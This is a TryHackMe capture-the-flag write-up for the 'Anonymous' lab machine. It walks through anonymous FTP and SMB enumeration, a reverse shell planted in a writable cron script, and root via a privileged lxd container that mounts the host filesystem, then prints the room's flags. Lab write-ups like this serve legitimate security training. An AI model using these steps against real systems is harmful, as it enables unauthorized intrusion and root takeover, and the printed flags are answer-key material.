---
title: TryHackMe - Anonymous Writeup
description: My writeup onAnonymous box.
categories:
 - tryhackme
tags: tryhackme
---

Hi all, this machine was fun, i enjoy it!

Also got 8 blood on it! :D

![](https://i.ibb.co/8B4WV1Y/Screenshot-1.png)

You can find the machine there > [Anonymous](https://tryhackme.com/room/anonymous){:target="_blank"}

As always let's start with a nmap scan.

```bash
$ ip=10.10.167.121
$ nmap -sC -sV -oN nmap.txt $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-19 15:24 EEST
Nmap scan report for 10.10.167.121 (10.10.167.121)
Host is up (0.092s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Great, we have to enumerate 2 services, FTP & SMB! Let's start with SMB.

Let's check the shares first. Sadly `smbmap` didnt work for some reason.

```bash
$ smbmap -H $ip
[!] Authentication error on 10.10.167.121
```

We can use `smbclient` tho.

```bash
$ smbclient -L //$ip -U ""
Enter WORKGROUP\'s password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
```

`pics` share seems interesting, let's connect.

```bash
$ smbclient //$ip/pics -U ""
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 14:11:34 2020
  ..                                  D        0  Thu May 14 04:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 03:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 03:43:42 2020

		20508240 blocks of size 1024. 13152580 blocks available
smb: \> 
```

There are 2 photos, i wasted like 1hour on them for stego but nothing, dead end haha. Let's move on to FTP.

We have FTP Anonymous,let's connect.

```bash
$ ftp $ip
Connected to 10.10.167.121.
220 NamelessOne's FTP Server!
Name (10.10.167.121:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 May 17 21:30 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
-rwxr-xrwx    1 1000     1000          314 May 14 14:52 clean.sh
-rw-rw-r--    1 1000     1000          215 May 19 12:35 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
ftp> 
```

This seems like a cron job, we can edit `clean.sh` file and add our reverse shell in! We can do that by using `GNOME Nautilus`

![](https://i.ibb.co/qxQ3ptb/Screenshot-2.png)

![](https://i.ibb.co/JHq3DXt/Screenshot-3.png)

![](https://i.ibb.co/WD1zX9L/Screenshot-4.png)

![](https://i.ibb.co/vXCZb8v/Screenshot-5.png)

Bingo! We have shell!

```bash
$ nc -lvp 5555
listening on [any] 5555 ...
connect to [$your_ip] from 10.10.167.121 [10.10.167.121] 43770
namelessone@anonymous:~$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
namelessone@anonymous:~$ whoami
whoami
namelessone
namelessone@anonymous:~$ 
```

Now, privesc is pretty easy, we have to exploit `lxd` group.

```bash
namelessone@anonymous:~$ groups
groups
namelessone adm cdrom sudo dip plugdev lxd
```

lxd = system container manager 

First we have to build the `lxd alpine builder` on our machine and then wget to target box.

```bash
$ git clone  https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
Receiving objects: 100% (27/27), 16.00 KiB | 780.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.
$ cd lxd-alpine-builder/
$ ./build-alpine
... junk data ...
(1/1) Installing libcrypto1.1 (1.1.1g-r0)
OK: 8 MiB in 19 packages
```

Now we have to `wget` the output `.tar.gz` file to target's box.

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
namelessone@anonymous:/tmp$ wget $your_ip/alpine-v3.11-x86_64-20200519_1600.tar.gz
namelessone@anonymous:/tmp$ ls
alpine-v3.11-x86_64-20200519_1600.tar.gz
```

Now follow my steps :

```bash
namelessone@anonymous:/tmp$ lxc image import $your_tar_name.tar.gz --alias myimage
namelessone@anonymous:/tmp$ lxd init (yes to all)
namelessone@anonymous:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
namelessone@anonymous:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
namelessone@anonymous:/tmp$ lxc start ignite
lxc start ignite
namelessone@anonymous:/tmp$ lxc exec ignite /bin/sh
lxc exec ignite /bin/sh
~ # whoami; id
whoami; id
root
uid=0(root) gid=0(root)
```

Let's read the flags now, for `root` we have to go to mount directory.

```bash
/mnt/root/root # cat root.txt
cat root.txt
4d930091c31a622a7ed10f27999af363
```

For user's flag, we have to go back to normal shell.

```bash
namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f992585815ff991e68748c414740
```

That's it, lot of fun! See you!
